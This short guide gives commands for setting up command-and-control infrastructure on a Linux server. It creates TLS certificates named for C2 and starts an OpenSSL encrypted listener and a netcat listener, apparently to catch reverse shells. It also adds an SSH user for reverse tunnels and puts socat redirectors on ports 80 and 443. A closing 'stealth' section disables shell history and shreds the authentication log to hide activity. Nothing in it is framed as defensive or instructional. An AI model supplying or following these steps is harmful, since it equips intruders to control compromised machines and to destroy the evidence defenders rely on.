
---

### 1. Minimal system prep

A. Update OS:

```bash
sudo apt update && sudo apt upgrade -y
```

B. Disable unwanted services:

```bash
sudo systemctl disable apache2 --now
```

C. Enable firewall allowing only essential ports:

```bash
sudo ufw allow 22/tcp
sudo ufw allow 443/tcp
sudo ufw enable
```

### 2. Generate ephemeral TLS certs **manually**

A. Create private key:

```bash
openssl genpkey -algorithm RSA -out /tmp/c2.key -pkeyopt rsa_keygen_bits:4096
```

B. Create self-signed cert interactively:

```bash
openssl req -new -x509 -key /tmp/c2.key -out /tmp/c2.crt -days 365
```

### 3. Run OpenSSL encrypted listener

```bash
openssl s_server -quiet -key /tmp/c2.key -cert /tmp/c2.crt -port 8443
```

### 4. Run fallback netcat raw TCP listener

```bash
nc -lvnp 2222
```

### 5. Set up SSH user for reverse tunnels

A. Add user:

```bash
sudo adduser c2user
```

B. Manually add public key to `/home/c2user/.ssh/authorized_keys` (copy-paste)
C. Edit `/etc/ssh/sshd_config` manually, set:

```
PasswordAuthentication no
AllowTcpForwarding yes
GatewayPorts yes
```

D. Reload sshd:

```bash
sudo systemctl reload sshd
```

### 6. Port forwarding with socat â€” run manually

```bash
socat TCP4-LISTEN:443,fork TCP4:127.0.0.1:8443
```

```bash
socat TCP4-LISTEN:80,fork TCP4:127.0.0.1:2222
```

### 7. Manual health check & restart

If a listener dies: kill and rerun the respective command manually.

### 8. Clean up & stealth

A. Disable bash history in current session:

```bash
unset HISTFILE
```

B. Clear logs manually when needed:

```bash
sudo shred -u /var/log/auth.log
```

---


